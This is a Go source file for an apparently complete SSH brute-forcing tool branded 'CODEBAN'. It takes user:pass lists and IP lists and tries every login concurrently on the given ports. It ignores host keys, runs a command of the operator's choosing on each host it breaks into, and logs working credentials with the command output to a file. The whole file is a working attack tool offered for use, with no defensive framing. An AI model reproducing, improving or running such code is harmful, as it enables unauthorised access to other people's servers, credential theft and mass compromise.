package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"

	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
)

var (
	ipSegmentFlag  CIDRFlag
	ipUserPairs    = make(map[string]*connectionStatus)
	ipUserPairsMu  sync.Mutex
	wg             sync.WaitGroup
	allowedIPRange *net.IPNet
	portFlag       PortFlag
)

type connectionStatus struct {
	Good bool
	Bad  bool
	// Add more status fields if needed
}

const (
	TimeoutSeconds = 5
)

type CustomError struct {
	Message string
}

func (e *CustomError) Error() string {
	return e.Message
}

func NewCustomError(message string) *CustomError {
	return &CustomError{Message: message}
}

// CIDRFlag is a custom type to hold CIDR notation for IP filtering
type CIDRFlag struct {
	CIDR string
}

func (c *CIDRFlag) String() string {
	return c.CIDR
}

func (c *CIDRFlag) Set(value string) error {
	c.CIDR = value
	_, ipNet, err := net.ParseCIDR(value)
	if err != nil {
		return err
	}
	allowedIPRange = ipNet
	return nil
}

type PortFlag struct {
	PortsFile string
	Ports     []string
}

func (p *PortFlag) String() string {
	return strings.Join(p.Ports, ",")
}

func (p *PortFlag) Set(value string) error {
	p.PortsFile = value
	ports, err := readPortsFile(value)
	if err != nil {
		return err
	}
	p.Ports = ports
	return nil
}

func readPortsFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var ports []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		ports = append(ports, scanner.Text())
	}

	return ports, scanner.Err()
}

func createSSHSession(ip, username, port, password string) (*ssh.Session, error) {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%s", ip, port), config)
	if err != nil {
		return nil, NewCustomError(fmt.Sprintf("Error creating SSH session for %s@%s:%s", username, ip, port))
	}

	session, err := client.NewSession()
	if err != nil {
		return nil, NewCustomError(fmt.Sprintf("Error creating SSH session for %s@%s:%s", username, ip, port))
	}

	return session, nil
}

func isNoLogin(err error) bool {
	if err != nil {
		if strings.Contains(err.Error(), "permission denied") {
			return true
		}
		// Add other checks based on expected behavior
	}
	return false
}

func checkConnectionForIP(user, pass, command, ip, port string) {
	defer wg.Done()

	if allowedIPRange != nil {
		ipAddr := net.ParseIP(ip)
		if ipAddr == nil || !allowedIPRange.Contains(ipAddr) {
			// Skip IP if it's not valid or not in the allowed range
			return
		}
	}

	session, err := createSSHSession(ip, user, port, pass)
	if err != nil {
		if isNoLogin(err) {
			handleNoLogin(ip, user, pass, port)
		} else {
			// Ignore other errors
			return
		}
	}
	defer func() {
		if session != nil {
			session.Close()
		}
	}()

	var output []byte
	output, err = session.CombinedOutput(command)
	if err != nil {
		if isNoLogin(err) {
			handleNoLogin(ip, user, pass, port)
		} else {
			// Ignore other errors
			return
		}
		return
	}

	handleGoodConnection(ip, user, pass, output, port)
}

func checkVPS(userpassFile, command, ipListFile string, ports []string, threads int) {
	upf, err := os.Open(userpassFile)
	if err != nil {
		handleError(NewCustomError(fmt.Sprintf("Passfile - %s", err)))
		return
	}
	defer upf.Close()

	semaphore := make(chan struct{}, threads)

	printBanner()
	fmt.Printf("\n\n\033[01;34m[\033[01;31m▶\033[01;34m] \033[01;34mBrute Started\033[0m\n\n")

	scanner := bufio.NewScanner(upf)
	for scanner.Scan() {
		var wg sync.WaitGroup // Create a new WaitGroup for each iteration
		userPass := scanner.Text()
		parts := strings.SplitN(userPass, ":", 2)
		if len(parts) == 2 {
			user := parts[0]
			pass := parts[1]

			fmt.Printf("\033[01;34m[\033[0m %s \033[01;34m]\033[0m - \033[01;34m[\033[0m %s \033[01;34m]\033[0m\n", user, pass)

			ipf, err := os.Open(ipListFile)
			if err != nil {
				handleError(NewCustomError(fmt.Sprintf("IP List - %s", err)))
				continue
			}
			defer ipf.Close()

			scannerIP := bufio.NewScanner(ipf)
			for scannerIP.Scan() {
				ip := scannerIP.Text()

				for _, port := range ports {
					// Acquire semaphore
					semaphore <- struct{}{}
					wg.Add(1)
					go func(user, pass, command, ip, port string) {
						defer wg.Done()
						checkConnectionForIP(user, pass, command, ip, port)
						// Release semaphore
						<-semaphore
					}(user, pass, command, ip, port)
				}
			}
		} else {
			warningMessage := fmt.Sprintf("Warn - Invalid user:pass format: %s\n", userPass)
			color.Cyan(warningMessage)
		}

		// Wait for all goroutines to finish before moving to the next user
		wg.Wait()
	}

	// Display the colored completion message
	fmt.Println("\n\033[01;34m[\033[01;31m      -- Finished --     \033[01;34m]\033[0m")
}

func handleGoodConnection(ip, user, pass string, output []byte, port string) {
	fmt.Printf("[ Good ] [ %s ] - [ %s ] [ %s ] [ %s ]\n", user, ip, pass, port)
	fmt.Printf("[ CMD ] - %s\n", output)
	vulnf, err := os.OpenFile("good_logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		handleError(NewCustomError("Failed to open good_logins.txt"))
		return
	}
	defer vulnf.Close()

	ipUserPairsMu.Lock()
	defer ipUserPairsMu.Unlock()

	ipKey := fmt.Sprintf("%s:%s", ip, port)

	if _, exists := ipUserPairs[ipKey]; !exists {
		ipUserPairs[ipKey] = &connectionStatus{}
	}
	ipUserPairs[ipKey].Good = true

	logToFile(vulnf, fmt.Sprintf("[ Good ] | %s@%s %s [ %s ]\n[ CMD ] - %s", user, ip, pass, port, output))
}

func handleNoLogin(ip, user, pass, port string) {
	fmt.Printf("[ NoLogin ] [ %s ] - [ %s ] [ %s ] [ %s ]\n", user, ip, pass, port)
	vulnf, err := os.OpenFile("nologin_logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		handleError(NewCustomError("Failed to open nologin_logins.txt"))
		return
	}
	defer vulnf.Close()

	ipUserPairsMu.Lock()
	defer ipUserPairsMu.Unlock()

	ipKey := fmt.Sprintf("%s:%s", ip, port)

	if _, exists := ipUserPairs[ipKey]; !exists {
		ipUserPairs[ipKey] = &connectionStatus{}
	}
	ipUserPairs[ipKey].Bad = true

	logToFile(vulnf, fmt.Sprintf("[ NoLogin ] | %s@%s %s [ %s ] ", user, ip, pass, port))
}

func logToFile(file *os.File, logEntry string) {
	if _, err := file.WriteString(logEntry + "\n"); err != nil {
		handleError(NewCustomError("Failed to write to log file"))
	}
}

func printBanner() {
	fmt.Println("\033[01;34m╔══════════════════════════════════════════════════╗")
	fmt.Println("\033[01;34m║\033[01;31m                  C O D E B A N                   \033[01;34m║")
	fmt.Println("\033[01;34m╚══════════════════════════════════════════════════╝")
}

func handleError(err error) {
	errorMessage := fmt.Sprintf("\n\t\t\033[31mC O\033[33m D E \033[096mB A N\033[0m\n\n\033[01;34m[ \033[01;31m-\033[01;34m ] \033[01;31mError \033[0m- %s\n", err)
	color.Cyan(errorMessage)
}

func main() {
	// Usage message with information about the -S and -P options
	usage := "Usage: ./brute <userpass file> <custom command> <ip list file> <threads> [-S <IP segment>] [-P <ports file>]"

	// Parse command line arguments
	flag.StringVar(&ipSegmentFlag.CIDR, "S", "", "IP segment in CIDR notation (optional)")
	flag.Var(&portFlag, "P", "File containing ports or a single port (optional)")
	flag.Parse()

	// Check if the number of arguments is correct
	if flag.NArg() != 4 {
		handleError(NewCustomError(usage))
		os.Exit(1)
	}

	// Extract command line arguments
	userpassFile := flag.Arg(0)
	command := flag.Arg(1)
	ipListFile := flag.Arg(2)
	threads, err := strconv.Atoi(flag.Arg(3))
	if err != nil {
		handleError(NewCustomError("Invalid thread count"))
		os.Exit(1)
	}

	// Parse the IP segment provided with the -S option
	if ipSegmentFlag.CIDR != "" {
		// Use ipSegmentFlag.CIDR directly
		_, ipNet, err := net.ParseCIDR(ipSegmentFlag.CIDR)
		if err != nil {
			handleError(NewCustomError("Invalid IP segment format"))
			os.Exit(1)
		}
		allowedIPRange = ipNet
	}

	// If -P flag is not provided, use a default port or allow setting it from cmdline
	if portFlag.PortsFile == "" {
		portFlag.Ports = []string{"22"} // Default port is 22, change as needed
	}

	// Perform the VPS check with the specified parameters
	checkVPS(userpassFile, command, ipListFile, portFlag.Ports, threads)
}
